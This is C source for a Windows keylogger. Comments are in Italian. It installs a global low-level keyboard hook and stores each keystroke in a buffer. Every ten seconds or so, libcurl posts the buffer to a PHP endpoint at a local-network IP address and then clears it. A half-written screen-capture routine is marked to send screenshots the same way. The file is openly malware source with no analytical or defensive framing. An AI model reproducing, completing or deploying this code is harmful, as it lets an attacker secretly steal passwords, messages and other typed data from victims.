#include <stdio.h>
#include <time.h>
#include "curl/curl.h"

#define BUFFERLEN 2
char *buffer;
unsigned int bufferIndex = 0;
unsigned int bufferSize = BUFFERLEN;
HANDLE mutex;


void ScreenCapture(int width, int height)
{
	HDC hDc = CreateCompatibleDC(0);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
	
	// convertire in PNG e inviare via curl
	
	DeleteObject(hBmp);
}

int FileSend(char *data, int length)
{
	FILE *log;
	log = fopen("log","a+");
	fprintf(log, "%*s", length, data);
	fclose(log);
	
	return 1;
}

int CurlSend(char *data, int length)
{
  CURL *curl;
  CURLcode res;
  
  curl_global_init(CURL_GLOBAL_ALL);
  curl = curl_easy_init();
  res = CURLE_OK;
  
  if(curl)
  {
  	char *inputStr = "input=";
  	char *httpStr = curl_easy_escape(curl, data, length);
  	
  	char *sendStr = (char *)malloc(strlen(inputStr) + strlen(httpStr) + 1);
  	strcpy(sendStr, inputStr);
  	strcat(sendStr, httpStr);
  	
    curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.100/send/send.php");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sendStr);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    curl_free(httpStr);
    free(sendStr);
  }
  curl_global_cleanup();
  
  if(res == CURLE_OK)
  {
  	return 1;
  }
  
  return 0;	
}



DWORD WINAPI ThreadFunc(void *data)
{
}

void ConvertKey(unsigned int key, char *outStr)
{
	BYTE keyboardState[256];
	WORD out;
	GetKeyboardState(keyboardState);
	int res = ToAsciiEx(key, MapVirtualKeyEx(key, 0, GetKeyboardLayout(0)), keyboardState, &out, 0, GetKeyboardLayout(0)); 

	if(res == 1)
	{
		outStr[0] = out & 0xff;
		outStr[1] = 0;
	}
	if(res == 2)
	{
		outStr[0] = out & 0xff;
		outStr[1] = (out >> 8) & 0xff;
		outStr[2] = 0;
	}
}

void SaveKey(unsigned int key)
{
	char keyStr[16];
	ConvertKey(key, keyStr);
	
	// lock
	WaitForSingleObject(mutex, INFINITE);
	
	int len = strlen(buffer);
	int available = bufferSize - len;
	
	if (strlen(keyStr) >= available)
	{
		bufferSize *= 2; // raddoppio la grandezza del buffer
		buffer = realloc(buffer, bufferSize);
	}
	
	strcat(buffer, keyStr);
	
	// unlock
	ReleaseMutex(mutex);
}

LRESULT CALLBACK RawInput(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;
    
    if (wParam == WM_KEYDOWN)
    {
    	SaveKey(keyboard->vkCode);
    }
    
    return 0;
}

DWORD WINAPI KeyLogger()
{
    HHOOK hKeyHook;
    HINSTANCE hExe = GetModuleHandle(NULL);
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)RawInput, hExe, 0);
    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}


int main(void)
{
	mutex = CreateMutex(NULL, FALSE, NULL);
	
	buffer = (char*)malloc(BUFFERLEN);
	buffer[0] = 0;
	
	HANDLE logger;
    logger = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);

	int timer = 0;
	int len;
	
	while(1)
	{
		if(timer > 10)
		{
			// lock
			WaitForSingleObject(mutex, INFINITE);
			
			len = strlen(buffer);
			
			// unlock
			ReleaseMutex(mutex);
			
			int res = CurlSend(buffer, len);
			if(res)
			{
				// lock
				WaitForSingleObject(mutex, INFINITE);
				
				// reset buffer
				strcpy(buffer, buffer + len);
				
				// unlock
				ReleaseMutex(mutex);
			}
			
			timer = 0;
		}
		timer++;
		Sleep(1000); // 1 sec sleep
	}
	
	return 0;
}
